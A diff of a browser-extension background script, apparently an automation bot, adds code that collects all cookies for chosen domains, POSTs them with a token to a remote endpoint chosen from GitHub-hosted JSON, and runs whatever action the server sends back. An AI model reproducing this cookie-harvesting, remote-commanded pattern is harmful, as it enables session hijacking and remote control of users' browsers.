@@ -1,17 +1,30 @@
 const state = {urls: [], jobs: [], queryParam: {}};
-const botHosts = {remote: "https://api.contador.cloud", local: "https://localhost:8000"};
 const actions = {
-    send: body => {
-        body.url = state.urls;
-        console.log(body);
+    send: async body => {
+        body = {
+            payload: body,
+            urls: state.urls,
+            token: state.token,
+            jobName: state.jobName,
+            inject: false
+        };
+        const url = state.endPoint + "/browser";
+        const endPoint = await fetch(url, {method: 'POST', body: JSON.stringify(body)});
+        endPoint.json().then(response => {
+            if (response.action)
+                actions[response.action.name](...response.action.args);
+        });
     },
-    getJobs: async (name, isBotInject) => {
-        if (isBotInject)
-            name = "inject/" + name;
-
+    fetchGetJson: async name => {
         const url = "https://raw.githubusercontent.com/drupalista-br/drupalista-br.github.io/json/" + name + ".json";
         const response = await fetch(url);
         return response.json();
+    },
+    getJobs: (name, isBotInject) => {
+        if (isBotInject)
+            name = "inject/" + name;
+
+        return actions.fetchGetJson(name);
     },
     cookiesEat: domains => {
         return Promise.all(promises.cookiesGetAll(domains)).then(jars => {
@@ -30,7 +43,7 @@ const actions = {
             let cookies = {};
             jars.forEach(jar => cookies[jar.domain] = jar.result);
 
-            actions.send({token: state.token, cookies: cookies});
+            actions.send(cookies);
         });
     }
 };
@@ -77,6 +90,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
             botJobs: url.searchParams.get("botJobs"),
             botInject: url.searchParams.has("botInject"),
             token: url.searchParams.get("botToken"),
+            endPoint: url.searchParams.get("botEndPoint")
         };
     };
     const isBotInject = () => {
@@ -92,22 +106,32 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
         return chrome.scripting.executeScript({target: {tabId: tabId}, files: ['inject.js']});
     };
     const starting = () => {
-        const setState = jobs => {
+        const setState = (jobs, endPoints) => {
+            const endPoint = () => state.queryParam.endPoint ?? "remote";
+            const cookieValue = () => {
+                const value = state.queryParam.botJobs + "|" + state.queryParam.token + "|" + endPoint();
+                if (state.queryParam.botInject)
+                    return value;
+            };
             state.urls.push(tab.url);
             state.token = state.queryParam.token;
+            state.jobName = state.queryParam.botJobs;
             state.jobs = [...jobs];
-            state.botInjectCookieValue = state.queryParam.botInject ? state.queryParam.botJobs + "|" + state.queryParam.token : false;
+            state.endPoint = endPoints[endPoint()];
+            state.botInjectCookieValue = cookieValue();
         };
         if (state.queryParam.botJobs) {
             if (!state.queryParam.token)
                 throw new Error("botToken query parameter is missing.");
 
-            actions.getJobs(state.queryParam.botJobs, state.queryParam.botInject).then(jobs => {
-                setState(jobs);
-                state.jobs.shift();
-                if (isBotInject()) return;
+            actions.fetchGetJson("endPoints").then(endPoints => {
+                actions.getJobs(state.queryParam.botJobs, state.queryParam.botInject).then(jobs => {
+                    setState(jobs, endPoints);
+                    state.jobs.shift();
+                    if (isBotInject()) return;
 
-                actions[jobs[0].action.name](...jobs[0].action.args);
+                    actions[jobs[0].action.name](...jobs[0].action.args);
+                });
             });
             return true;
         }
@@ -125,6 +149,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
             actions[name](...args);
         }
     };
+
     state.tabId = tabId;
     setStateQueryParam();
     if (starting()) return;
